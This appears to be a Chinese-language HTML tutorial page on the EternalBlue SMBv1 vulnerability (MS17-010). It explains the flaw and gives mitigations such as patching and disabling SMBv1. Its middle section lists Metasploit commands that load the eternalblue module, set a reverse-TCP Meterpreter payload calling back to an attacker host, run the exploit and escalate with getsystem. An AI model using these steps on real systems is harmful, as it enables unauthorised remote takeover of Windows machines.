<!DOCTYPE html>
<html lang="zh-CN">
<head>
</head>
<body>
    <canvas id="matrix"></canvas>
    
    <nav>
        <a href="#" class="glow">永恒之蓝20170146</a>
    </nav>
    <div class="container">
        <div class="post-list">
            <h2>CVE-2017-0146 MS17-010</h2>
            <div class="post-item"> 
                <div class="post-item-content">
                    <h3 class="glow">■ 漏洞详情</h3>
                    <p><strong>漏洞名称：</strong>永恒之蓝—CVE-2017-0146 MS17-010</p>
                    <p><strong>威胁等级：</strong>高危（CVSS 8.1）</p>
                    <p><strong>影响版本：</strong>
                        <ul>
                            <li>Windows 7</li>
                            <li>Windows Server 2008 R2</li>
                            <li>Windows Server 2012</li>
                            <li>未打补丁的Windows 10/8.1</li>
                        </ul>
                    </p>
                    <h3 class="glow">■ 技术原理</h3>
                    <p>攻击者通过发送精心构造的SMBv1协议请求到目标系统的445端口：</p>
                    <ul>
                        <li>利用SrvOs2FeaListSizeToNt函数中的缓冲区溢出</li>
                        <li>通过畸形FEA（文件扩展属性）结构覆盖内核内存</li>
                        <li>劫持控制流实现任意代码执行</li>
                        <li>NSA开发的ETERNALBLUE攻击模块实现内核态Shellcode注入</li>
                    </ul>

                    <h3 class="glow">■ 如何利用此漏洞？（Metasploit示例）</h3>
                    <p>执行以下步骤：</p>
                    <ol>
                        <li>启动Metasploit框架
                            <pre>msfconsole</pre>
                        </li>
                        <li>加载攻击模块
                            <pre>use exploit/windows/smb/ms17_010_eternalblue</pre>
                        </li>
                        <li>配置参数
                            <pre>
set RHOSTS 114.514.191.9810   # 目标IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 191.981.0.1    # 攻击机IP</pre>
                        </li>
                        <li>执行攻击
                            <pre>exploit -j</pre>
                        </li>
                        <li>成功后会返回Meterpreter会话：
                            <pre>meterpreter > getsystem</pre>
                        </li>
                    </ol>

                    <h3 class="glow">■ 防御措施</h3>
                    <ul>
                        <li>立即安装MS17-010安全更新</li>
                        <li>禁用SMBv1协议（PowerShell执行）：
                            <pre>Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</pre>
                        </li>
                        <li>配置防火墙阻止445端口入站连接</li>
                    </ul>
                </div>
            </div>  <!-- 闭合post-item div -->
        </div>
    </div>

    <script>
        // Matrix效果代码
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?';
        const drops = [];
        const fontSize = 14;
        const columns = canvas.width/fontSize;

        for (let i = 0; i < columns; i++) {
            drops[i] = 1;
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
                if (drops[i]*fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(drawMatrix, 50);
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>
</html>
